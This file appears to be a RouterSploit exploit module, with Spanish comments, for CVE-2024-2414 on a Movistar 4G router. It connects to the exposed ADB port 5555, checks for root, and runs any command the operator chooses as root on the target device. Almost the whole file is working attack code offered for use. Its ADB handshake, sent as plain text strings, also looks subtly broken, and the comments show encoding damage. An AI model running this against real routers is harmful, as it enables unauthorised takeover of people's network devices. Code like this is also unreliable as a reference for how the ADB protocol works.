from routersploit.core.exploit import *
from routersploit.core.tcp.tcp_client import TCPClient

class Exploit(TCPClient):
    __info__ = {
        "name": "Movistar 4G Router ES_WLD71-T1 ADB Root Shell",
        "description": "Explota CVE-2024-2414 para obtener acceso root mediante ADB en el puerto 5555",
        "authors": [
            "Tu Nombre",  # Implementaci贸n para RouterSploit
        ],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-2414",
        ],
        "devices": [
            "Movistar 4G Router ES_WLD71-T1 (versiones anteriores a ES_WLD71-T1_v2.0.214140)",
        ],
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(5555, "Target ADB port")
    cmd = OptString("id", "Comando a ejecutar")

    def run(self):
        if self.check():
            print_success("Target is vulnerable to CVE-2024-2414")
            
            # Conectar al servicio ADB
            if self.exploit_adb():
                print_success("Exploit successful - root shell access obtained")
            else:
                print_error("Failed to exploit the vulnerability")
        else:
            print_error("Target is not vulnerable")
    
    def check(self):
        print_status("Checking for ADB service on port 5555...")
        
        try:
            # Intentar conexi贸n al puerto ADB
            sock = self.tcp_create()
            sock.connect()
            
            # Enviar mensaje de identificaci贸n ADB
            sock.send(b"host::features=shell_v2,cmd,stat_v2,ls_v2,fixed_push_mkdir,apex,abb,fixed_push_symlink_timestamp,abb_exec,remount_shell,track_app,sendrecv_v2,sendrecv_v2_brotli,sendrecv_v2_lz4,sendrecv_v2_zstd,sendrecv_v2_dry_run_send")
            
            # Verificar respuesta
            response = sock.recv(1024)
            
            if response and response.startswith(b"OKAY"):
                print_success("ADB service found and responding")
                
                # Verificar si podemos ejecutar comandos como root
                sock.send(b"shell:id")
                id_response = sock.recv(1024)
                
                if b"uid=0" in id_response:
                    print_success("Root access available via ADB")
                    sock.close()
                    return True
            
            sock.close()
            return False
            
        except Exception as e:
            print_error(f"Connection error: {str(e)}")
            return False
    
    def exploit_adb(self):
        try:
            # Conectar al servicio ADB
            sock = self.tcp_create()
            sock.connect()
            
            # Iniciar comunicaci贸n ADB
            sock.send(b"host::features=shell_v2,cmd,stat_v2,ls_v2,fixed_push_mkdir,apex,abb,fixed_push_symlink_timestamp,abb_exec,remount_shell,track_app,sendrecv_v2,sendrecv_v2_brotli,sendrecv_v2_lz4,sendrecv_v2_zstd,sendrecv_v2_dry_run_send")
            handshake = sock.recv(1024)
            
            if not handshake.startswith(b"OKAY"):
                sock.close()
                return False
            
            # Ejecutar comando especificado
            cmd_msg = f"shell:{self.cmd}".encode()
            
            sock.send(cmd_msg)
            
            # Recibir respuesta
            response = sock.recv(4096)
            
            if response:
                print_status("Command output:")
                print_info(response.decode('utf-8', errors='ignore').strip())
                sock.close()
                return True
            
            sock.close()
            return False
            
        except Exception as e:
            print_error(f"Exploit error: {str(e)}")
            return False
